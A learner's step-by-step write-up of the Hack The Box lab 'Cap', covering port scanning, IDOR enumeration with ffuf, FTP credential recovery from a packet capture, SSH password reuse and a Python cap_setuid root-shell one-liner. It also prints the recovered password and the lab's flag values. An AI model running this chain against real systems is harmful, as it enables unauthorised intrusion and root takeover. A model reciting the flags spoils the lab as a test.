# 🧢 CAP — HTB Starting Point

**Machine:** #005 — Day 05  
**Difficulty:** Easy  
**Platform:** Hack The Box — Starting Point  
**Operating System:** Linux  
**Target IP:** `10.129.151.77`

**Tags:** `#HTB` `#Easy` `#Linux` `#Nmap` `#FTP` `#PCAP` `#IDOR` `#SSH` `#PrivilegeEscalation` `#LinuxCapabilities`

---

# 🎯 Objective

Enumerate the target's open services, investigate the web application, discover exposed scan data, recover credentials from a packet capture, gain access through SSH, and exploit a misconfigured Linux capability to obtain root privileges.

This machine demonstrates how several relatively small security weaknesses can combine into a complete compromise.

## 🧰 Tools Used

- **Nmap** — Port scanning and service detection.
- **Web browser** — Investigating the web application.
- **ffuf** — Fuzzing numeric scan IDs.
- **Wireshark** — Analyzing packet captures.
- **FTP client** — Accessing the FTP service and retrieving files.
- **SSH** — Remote shell access.
- **Linux commands** — `ls`, `cat`, `getcap`, `whoami`, and Python.
- **Linux capabilities** — Understanding and exploiting a dangerous capability configuration.

---

# 📝 TASKS & SOLUTIONS

## Task 1 — Counting Open TCP Ports

**Question:** How many TCP ports are open?

**Answer:** `3`

### 🔍 Process

I encountered several VPN connection problems at the beginning. None of my pings were working, but I calmed down and tried different troubleshooting steps until the connection worked.

Once I could reach the target, I opened two terminal windows and ran:

```bash
sudo nmap -sV -p- 10.129.151.77
```

And:

```bash
sudo nmap -sV -T4 10.129.151.77
```

The second scan returned results much faster:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
                     (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

At first, I tried entering `80`, `22`, and `21` as my answer. None of them worked.

Then I reread the question. It wasn't asking me which ports were open. It was asking **how many** TCP ports were open.

I counted them and answered `3`.

### 📚 Lesson — Reading the question carefully

The scan discovered three open TCP ports:

| Port | Service | Purpose |
|---|---|---|
| 21 | FTP | File transfer |
| 22 | SSH | Secure remote shell access |
| 80 | HTTP | Web application |

The question asked for the count, not the port numbers.

This was a simple mistake, but it is worth remembering: read the question carefully before submitting an answer. Sometimes the evidence is already in front of us.

### 💭 Note — What was my VPN problem?

When a target is unreachable, it does not automatically mean the target is down.

Possible causes include:

- The VPN connection is not established.
- The VPN route has not been installed correctly.
- The target machine has not finished starting.
- A firewall is blocking ICMP ping.
- The target is reachable, but the service being tested is unavailable.

Ping uses ICMP. Nmap scans TCP ports. A target can block ping and still have open TCP services.

For future machines, I should distinguish between:

**“I cannot ping the target”** and **“I cannot reach the target's services.”**

They are not always the same problem.

---

## Task 2 — Discovering the Web Application Path

**Question:** After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the ID number of the scan. What is the `[something]`?

**Answer:** `data`

### 🔍 Process

I read the question carefully. The phrase "Security Snapshot" confused me, but the URL format looked familiar.

I entered the target IP address in my browser:

```text
http://10.129.151.77
```

I explored the web application and found a different tab that led to this URL:

```text
http://10.129.151.77/data/1
```

I noticed that the final number was `1`, which appeared to be the scan ID. The word immediately before it was `data`.

I submitted `data`, and it was correct.

### 📚 Lesson — Understanding the URL

Let's break down the URL:

```text
http://10.129.151.77/data/1
```

| Part | Meaning |
|---|---|
| `http://` | The protocol used to access the web application |
| `10.129.151.77` | The target's IP address |
| `/data/` | The web application's route |
| `1` | The scan's ID |

A web application's route determines which resource or function the application handles.

In this case, the application appears to use a route like:

```text
/data/<scan_id>
```

The route is important because the ID may refer to a specific user's scan.

### 💭 Note — What vulnerability does this suggest?

The URL alone does not prove that a vulnerability exists. However, it provides a clue worth investigating.

If the application lets a user change the scan ID and retrieve another user's scan without proper authorization, that is an example of **Insecure Direct Object Reference (IDOR)**.

IDOR is commonly discussed as a type of Broken Access Control.

The important security question is:

> Does the application verify that the current user is allowed to access the scan associated with the requested ID?

If it only checks whether the scan exists, rather than whether the user is authorized to view it, sensitive data could be exposed.

---

## Task 3 — Accessing Other Users' Scans

**Question:** Are you able to get to other users' scans?

**Answer:** `Yes`

### 🔍 Process

I first tried changing the number in the URL manually. I tested a few IDs, but I found the process confusing.

I decided to use `ffuf` to automate the ID testing.

After installing it, I encountered several errors because of typos and command mistakes. I slowed down, read the command more carefully, and realized that I had forgotten to put `FUZZ` at the end of the URL I wanted to test.

First, I created a list of numbers:

```bash
seq 1 100 > numbers.txt
```

Then I ran:

```bash
ffuf -u "http://10.129.151.77/data/FUZZ" -w numbers.txt -fc 302
```

The output showed scan IDs that returned HTTP status `200`:

```text
1   [Status: 200, Size: 17144, Words: 7066, Lines: 371]
3   [Status: 200, Size: 17144, Words: 7066, Lines: 371]
2   [Status: 200, Size: 17144, Words: 7066, Lines: 371]
```

The order of the results wasn't necessarily numerical, but the important part was that multiple IDs returned successful responses.

I was able to switch between scans and investigate other users' data.

### 📚 Lesson — What is ffuf?

`ffuf` stands for **Fuzz Faster U Fool**.

It is a web fuzzing tool. Fuzzing means sending many different inputs to an application to observe how it responds.

In this task, I was using ffuf to test different values for the scan ID.

The command:

```bash
ffuf -u "http://10.129.151.77/data/FUZZ" -w numbers.txt -fc 302
```

contains several important parts:

| Option | Meaning |
|---|---|
| `-u` | Specifies the URL to test |
| `FUZZ` | A placeholder that ffuf replaces with each wordlist entry |
| `-w numbers.txt` | Specifies the wordlist |
| `-fc 302` | Filters out responses with HTTP status code 302 |

The wordlist contained numbers from 1 to 100. ffuf inserted each number in place of `FUZZ`.

For example, it tested URLs such as:

```text
http://10.129.151.77/data/1
http://10.129.151.77/data/2
http://10.129.151.77/data/3
...
http://10.129.151.77/data/100
```

### 📚 Lesson — What does `seq 1 100` do?

The command:

```bash
seq 1 100
```

prints the numbers from 1 to 100.

The redirection operator `>` sends the output into a file:

```bash
seq 1 100 > numbers.txt
```

This creates `numbers.txt` containing the numbers that ffuf will use.

### 📚 Lesson — What does `-fc 302` do?

HTTP status code `302` means the server is redirecting the client to another URL.

The `-fc` option in ffuf filters responses by HTTP status code. In this case, it tells ffuf to hide responses with status `302`.

That can be useful when the application redirects requests that are not valid or are not authorized.

However, filtering is not the same as proving that the remaining results are vulnerable. The results still need to be investigated.

### 💭 Note — Why did I need `FUZZ`?

Because ffuf needs to know where to insert the values from the wordlist.

Without the placeholder, the tool would not know which part of the URL should change.

For example:

```text
http://10.129.151.77/data/FUZZ
```

means:

> Replace `FUZZ` with each word or number from the wordlist.

### ⚠️ Important security lesson — IDOR / Broken Access Control

The web application allowed access to scans associated with other IDs.

This is an authorization problem. The application should verify that the authenticated user is permitted to access the requested scan.

A secure implementation should not rely on a user being unable to guess another scan's ID.

Even if scan IDs are random or difficult to guess, the application must still enforce authorization.

---

## Task 4 — Finding the Sensitive PCAP

**Question:** What is the ID of the PCAP file that contains sensitive data?

**Answer:** `0`

### 🔍 Process

I had a mistake in my enumeration process. When I created the number list, I used:

```bash
seq 1 100 > numbers.txt
```

That meant I tested IDs from 1 through 100.

I forgot about ID `0`.

Unfortunately, scan ID `0` was the one that contained sensitive information.

### 📚 Lesson — Enumeration should include the entire relevant range

This was a big lesson.

My command:

```bash
seq 1 100
```

does not include `0`.

If I wanted to include zero, I could have used:

```bash
seq 0 100 > numbers.txt
```

The important point is not that every scan ID always begins at zero. It is that I should pay attention to the range I am testing and consider whether there are values I have excluded.

I had already discovered that the application exposed scan data through its IDs. The missing step was making sure my enumeration covered the relevant range.

---

## Task 5 — Identifying the Protocol in the PCAP

**Question:** Which application layer protocol in the PCAP file can the sensitive data be found in?

**Answer:** `FTP`

### 🔍 Process

I was confused about how to analyze a PCAP file, so I followed a video guide.

When I opened the capture in Wireshark, I saw a lot of packets and information I didn't understand.

I found the FTP traffic, selected it, and followed the relevant packet stream. That revealed a username and password.

### 📚 Lesson — What is a PCAP file?

PCAP stands for **Packet Capture**.

A PCAP file stores captured network traffic. It can contain information about the packets exchanged between systems, including:

- Source and destination IP addresses.
- Source and destination ports.
- Protocols.
- Packet contents, when available.
- Application-layer data.

A PCAP is like a recording of network communication. Instead of watching a video, you are examining the packets that were exchanged.

### 📚 Lesson — What is Wireshark?

Wireshark is a network protocol analyzer. It allows us to inspect captured traffic and understand what happened during a communication session.

For example, Wireshark can help us investigate:

- Which systems communicated.
- Which protocols were used.
- Whether a connection was established.
- What data was exchanged.
- Whether sensitive information was transmitted in plaintext.

### 📚 Lesson — What does "Follow TCP Stream" mean?

Many application protocols exchange information across multiple TCP packets.

The **Follow TCP Stream** feature reconstructs the communication between the two endpoints into a readable conversation.

Instead of examining every packet separately, we can see the application-level exchange in a more organized way.

In this machine, following the FTP stream exposed the username and password.

### 💭 Note — Why was FTP exposing credentials?

Traditional FTP does not encrypt its control traffic.

When a client authenticates to an FTP server, the username and password can be transmitted in a readable form. Anyone who can capture the relevant network traffic may be able to recover those credentials.

This is why FTP is often considered insecure for transmitting credentials over untrusted networks.

Secure alternatives include:

- **SFTP** — File transfer over SSH.
- **FTPS** — FTP protected with TLS.

These are different protocols or protocol configurations, not interchangeable names for the same thing.

---

## Task 6 — Reusing the FTP Password for SSH

**Question:** We've managed to collect Nathan's FTP password. On what other service does this password work?

**Answer:** `SSH`

### 🔍 Process

I tried logging into SSH using Nathan's username and the password recovered from the PCAP:

```bash
ssh nathan@10.129.151.77
```

SSH asked for the password. I entered the recovered credential:

```text
Buck3tH4TF0RM3!
```

The login succeeded, and I received a shell on the target.

The welcome message showed information about the Ubuntu system, its resource usage, updates, and the current login.

I then ran:

```bash
ls
```

The output showed:

```text
user.txt
```

I read it:

```bash
cat user.txt
```

And retrieved the user flag:

```text
0d228afd8417990035c48aeb07ec36fa
```

### 📚 Lesson — Why did the same password work for SSH?

Because the target allowed the same credentials to authenticate to more than one service.

The FTP service exposed Nathan's credentials. The SSH service accepted those credentials.

This is an example of **credential reuse**.

The security problem is not necessarily that the password was weak. The problem is that the same password could be used to access multiple services.

If one service exposes the credential, an attacker may be able to use it to access another service.

### 📚 Lesson — What is SSH?

SSH stands for **Secure Shell**.

It is a protocol used to securely connect to remote systems and execute commands.

The command:

```bash
ssh nathan@10.129.151.77
```

means:

- `ssh` — Start the SSH client.
- `nathan` — The username to authenticate as.
- `10.129.151.77` — The remote system.

After successful authentication, the SSH server provides a remote shell.

---

## Task 7 — Retrieving the User Flag

**Question:** Submit the flag located in the Nathan user's home directory.

**Answer:** `0d228afd8417990035c48aeb07ec36fa`

### 🔍 Process

I also tried accessing the FTP service directly:

```bash
ftp 10.129.151.77
```

I entered Nathan's username and the recovered password. The server accepted the login:

```text
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

I then ran:

```text
ftp> ls
```

The output showed:

```text
-r-------- 1 1001 1001 33 Oct 27 23:39 user.txt
```

I tried:

```text
ftp> cat user.txt
```

But the FTP client returned:

```text
?Invalid command.
```

I then used:

```text
ftp> get user.txt
```

The file downloaded successfully. I switched to another terminal window and ran:

```bash
cat user.txt
```

That displayed the user flag.

### 📚 Lesson — Why didn't `cat` work inside FTP?

Because the FTP client is not a Linux shell.

The `cat` command belongs to the Linux shell. The FTP client has its own commands, such as:

- `ls` — List remote files.
- `cd` — Change the remote directory.
- `get` — Download a remote file.
- `put` — Upload a local file to the remote server.
- `help` — Display FTP client commands.

The correct sequence was:

```text
ftp> get user.txt
```

Then, in the normal Linux terminal:

```bash
cat user.txt
```

This is another example of the same concept from Redeemer: **different command-line environments have different commands.**

### 📚 Lesson — Understanding the file permissions

The listing:

```text
-r-------- 1 1001 1001 33 Oct 27 23:39 user.txt
```

contains several fields.

| Field | Meaning |
|---|---|
| `-` | Regular file |
| `r--------` | Owner has read permission; group and others have no permissions |
| `1` | Number of hard links |
| `1001` | Owner's user ID |
| `1001` | Group ID |
| `33` | File size in bytes |
| `Oct 27 23:39` | Last modification time |
| `user.txt` | Filename |

The file was readable by its owner. Because I was authenticated as Nathan, I could access it.

---

## Task 8 — Discovering a Dangerous Linux Capability

**Question:** What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?

**Answer:** `/usr/bin/python3.8`

### 🔍 Process

I was lost at this point and started copying commands from online resources.

I first tried:

```bash
getcap -r / 2>/dev/null
```

I didn't really understand what the command was doing.

Then I tried:

```bash
/usr/bin/python3
```

That didn't work for the task. I found:

```text
/usr/bin/python3.8
```

And that was the correct answer.

### 📚 Lesson — What are Linux capabilities?

Linux capabilities are a way of dividing traditional root privileges into smaller pieces.

Normally, the root user has broad privileges. Linux capabilities allow specific processes or executables to receive particular privileges without requiring the entire program to run as root.

For example, a capability might allow a program to:

- Bind to certain privileged network ports.
- Change process user IDs.
- Perform specific network operations.
- Bypass certain filesystem permission checks.

This can be useful for legitimate software, but it can also create security problems when a powerful capability is assigned to a program that users can execute.

### 📚 Lesson — What does `getcap` do?

The `getcap` utility displays the capabilities associated with files.

The command:

```bash
getcap -r / 2>/dev/null
```

can be broken down as follows:

| Part | Meaning |
|---|---|
| `getcap` | Display file capabilities |
| `-r` | Recursively search through directories |
| `/` | Start the search from the filesystem root |
| `2>/dev/null` | Redirect standard error to `/dev/null` |

The last part is especially useful.

During a filesystem-wide search, the command may encounter directories that it cannot access. Those errors can produce a lot of noise.

`2>/dev/null` hides the error messages, leaving the capability results easier to read.

### 📚 Lesson — What capability mattered on Cap?

The important capability on this machine is associated with changing process user IDs:

```text
cap_setuid
```

The Python binary has a capability configuration that allows it to change its process UID.

The exact capability assignment is typically visible in `getcap` output. For this machine, the relevant capability is `cap_setuid` with effective and permitted capability flags.

This is dangerous because Python is a powerful, general-purpose programming language. If a user can execute a Python binary that has the ability to change its UID, they may be able to use it to become root.

### 💭 Note — Why Python specifically?

Python can execute system calls and launch other programs.

The issue is not that Python is inherently dangerous. The issue is that this particular Python executable has a special capability that gives it privileges beyond those normally available to Nathan.

A program that can change its UID can potentially change its process identity to UID `0`, which is the traditional numeric user ID for root.

That is the basis of the privilege escalation in this machine.

---

## Task 9 — Obtaining Root

**Question:** Submit the flag located in root's home directory.

**Answer:** `d26aac74c773629f2592221cb8912748`

### 🔍 Process

I ran this command:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Suddenly, my prompt changed from:

```text
nathan@cap:~$
```

to:

```text
root@cap
```

I ran:

```bash
whoami
```

And it returned:

```text
root
```

I then tried:

```bash
ls
```

But I didn't see the root flag. I only saw the user flag.

I searched online and found the command:

```bash
cat /root/root.txt
```

That displayed the root flag.

### 📚 Lesson — Breaking down the Python command

This command is the heart of the privilege escalation:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Let's break it down.

#### `python3.8`

Runs the Python 3.8 interpreter.

#### `-c`

Tells Python to execute the code supplied as a string directly on the command line.

For example:

```bash
python3.8 -c 'print("Hello")'
```

runs a short Python program without needing to create a separate `.py` file.

#### `import os`

Imports Python's `os` module.

This module provides functionality for interacting with the operating system, including process-related operations.

#### `os.setuid(0)`

This is the critical part.

`setuid` is an operating-system function that sets the user ID of the process.

The argument `0` refers to the root user.

Because the Python binary on this machine has the relevant `cap_setuid` capability, the process can change its UID to `0`.

Without that capability or another suitable privilege, an ordinary user would not normally be allowed to perform this operation.

#### `os.system("/bin/bash")`

This asks Python to execute the command:

```text
/bin/bash
```

Bash is a shell.

Because the process has changed its UID to `0`, the newly launched shell inherits the root identity in this lab setup.

That is why the prompt changes to:

```text
root@cap
```

And why:

```bash
whoami
```

returns:

```text
root
```

### 📚 Lesson — Why did `ls` not show the root flag?

Because I was still in Nathan's home directory.

When I obtained the root shell, I did not automatically change my current working directory to `/root`.

The command:

```bash
ls
```

lists the contents of the current directory.

The root flag is located at:

```text
/root/root.txt
```

So I used the full path:

```bash
cat /root/root.txt
```

This reads the file directly from root's home directory.

### 💭 Note — What actually happened?

The complete privilege escalation sequence was:

1. Nathan logged in through SSH.
2. Nathan had permission to execute `/usr/bin/python3.8`.
3. That Python binary had the `cap_setuid` capability.
4. Python called `os.setuid(0)`.
5. The process changed its UID to root.
6. Python launched Bash.
7. Bash ran with root privileges.
8. The root shell could access `/root/root.txt`.

This is a **Linux privilege escalation caused by an overly powerful file capability**.

The system administrator should not have granted that capability to a general-purpose interpreter accessible to an unprivileged user.

---

# 🧠 OVERALL ANALYSIS

## 1. What happened in the web application?

The web application exposed scan information using a URL structure like:

```text
/data/<scan_id>
```

I was able to change the ID and access scans belonging to other users.

This is a form of **Broken Access Control**, commonly described as an **IDOR** when an object reference is directly exposed and can be manipulated.

### Why does this vulnerability happen?

A vulnerable application might do something like:

1. Receive a request for `/data/5`.
2. Find scan record number 5.
3. Return the scan data.

But it fails to check whether the current user is authorized to access record 5.

A secure application should perform an authorization check before returning the object.

For example, the application should verify that the current user owns the scan or has another legitimate permission to view it.

### Is this a documented attack?

Yes. IDOR and Broken Access Control are well-known web application security issues.

They can expose:

- User profiles.
- Private documents.
- Financial records.
- Medical records.
- Reports.
- Scan results.
- Other user-specific information.

The underlying weakness is not necessarily that IDs are sequential. The weakness is that the application fails to enforce authorization.

Even an application using random IDs must still check access permissions.

---

## 2. What happened in the PCAP?

A PCAP file is a captured record of network traffic.

The scan data exposed through the web application included a packet capture containing FTP traffic.

FTP commonly uses an unencrypted control connection. During authentication, the username and password may be sent in readable form.

Wireshark allowed me to reconstruct the FTP communication and discover Nathan's credentials.

The sequence was:

**Exposed PCAP → FTP traffic → readable credentials → SSH login**

### Why were the credentials there in the first place?

Because the FTP protocol was used to authenticate a user, and the captured traffic contained the authentication exchange.

The PCAP was not magically creating a password. It was recording communication that had already occurred.

This is why network encryption matters. If credentials are transmitted in plaintext, someone who can capture the traffic may be able to recover them.

---

## 3. What happened during privilege escalation?

The final step was a Linux capability misconfiguration.

The Python executable:

```text
/usr/bin/python3.8
```

had the capability:

```text
cap_setuid
```

This allowed the process to change its user ID.

The Python code:

```python
import os
os.setuid(0)
```

changed the process UID to root.

Then:

```python
os.system("/bin/bash")
```

launched Bash.

The result was a root shell.

### Why is this a vulnerability?

Because the system allowed an unprivileged user to execute a general-purpose interpreter that could change its process identity to root.

The interpreter could execute arbitrary Python code, so the capability effectively allowed the user to obtain root privileges.

The capability should not have been assigned in this way.

---

# 🔗 THE COMPLETE ATTACK CHAIN

This is the sequence that led from initial access to root:

<CodeBlock language="mermaid" editable>
flowchart TD
    A["Initial VPN connection"] --> B["Nmap discovers ports 21, 22, 80"]
    B --> C["Investigate web application"]
    C --> D["Discover /data/scan_id route"]
    D --> E["IDOR / Broken Access Control"]
    E --> F["Access another user's scan"]
    F --> G["Find sensitive PCAP, ID 0"]
    G --> H["Analyze FTP traffic in Wireshark"]
    H --> I["Recover Nathan's credentials"]
    I --> J["SSH login as Nathan"]
    J --> K["Retrieve user.txt"]
    K --> L["Enumerate Linux capabilities"]
    L --> M["Discover cap_setuid on Python 3.8"]
    M --> N["Change process UID to 0"]
    N --> O["Launch Bash as root"]
    O --> P["Read /root/root.txt"]
</CodeBlock>

This is why the machine is interesting. No single step required an incredibly advanced exploit. The compromise resulted from multiple weaknesses that connected together.

---

# 📖 COMMAND REFERENCE

## Nmap

```bash
# Scan all TCP ports and detect services
sudo nmap -sV -p- 10.129.151.77

# Faster scan of the default common ports
sudo nmap -sV -T4 10.129.151.77
```

## Create a numeric wordlist and fuzz scan IDs

```bash
# Generate numbers from 0 to 100
seq 0 100 > numbers.txt

# Test the scan IDs
ffuf -u "http://10.129.151.77/data/FUZZ" -w numbers.txt -fc 302
```

## SSH access

```bash
ssh nathan@10.129.151.77
```

## FTP access and file retrieval

```bash
ftp 10.129.151.77
```

Inside the FTP client:

```text
ls
get user.txt
exit
```

In the normal Linux shell:

```bash
cat user.txt
```

## Find Linux file capabilities

```bash
getcap -r / 2>/dev/null
```

## Privilege escalation

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verify the user:

```bash
whoami
```

Read the root flag:

```bash
cat /root/root.txt
```

---

# 🔁 REVIEW PLAN

## Tomorrow — recall without looking

1. Which three TCP ports were open?
2. What does the route `/data/1` suggest?
3. What is IDOR?
4. What does `FUZZ` mean in ffuf?
5. What does `-fc 302` filter?
6. What is a PCAP file?
7. Why can FTP expose credentials?
8. What is the difference between FTP and SFTP?
9. What is a Linux capability?
10. What does `cap_setuid` allow a process to do?
11. Why does `os.setuid(0)` matter?
12. Why did the root flag require `/root/root.txt`?

## Later — practical recall

Repeat the workflow in an authorized lab:

1. Enumerate the target.
2. Investigate the web application.
3. Test whether scan IDs expose other users' data.
4. Analyze the PCAP.
5. Recover the credentials.
6. Log in through SSH.
7. Enumerate capabilities.
8. Explain why the Python capability is dangerous.
9. Explain the UID change and root shell.

The goal is not to memorize the exact commands. It is to understand why each stage leads to the next.

---

# 💭 PERSONAL REFLECTION

Cap was a much bigger step than the previous machines.

I had VPN problems, struggled with ffuf, forgot to include scan ID `0`, didn't understand the PCAP, and eventually copied commands during privilege escalation.

But the machine taught me something important: a complete compromise can be built from several smaller security weaknesses.

The web application exposed scan data. The scan data exposed FTP credentials. The credentials worked on SSH. The Linux capability allowed Python to become root.

The most important thing I need to do now is revisit the machine and understand the commands I used, especially the privilege escalation.

**Completing a machine is one milestone. Understanding why it worked is the next one.**

---

# 🤖 MY ASSESSMENT

Cap is a meaningful step forward in your HTB journey because it introduced several different areas of cybersecurity:

- Web application authorization.
- Network traffic analysis.
- Credential exposure.
- SSH access.
- Linux privilege escalation.
- Linux capabilities.

Your strongest moment was when you calmed down and worked through the VPN issue rather than abandoning the machine. Your biggest learning opportunity is the privilege escalation section: now that you have seen the technique, you should revisit it and explain each part of the command in your own words.

The core lesson is this:

**A system can be compromised without a single spectacular exploit. Sometimes the danger comes from a chain of ordinary weaknesses that reinforce one another.**

Day 05 — Cap completed. Another machine documented, another attack chain understood a little better.
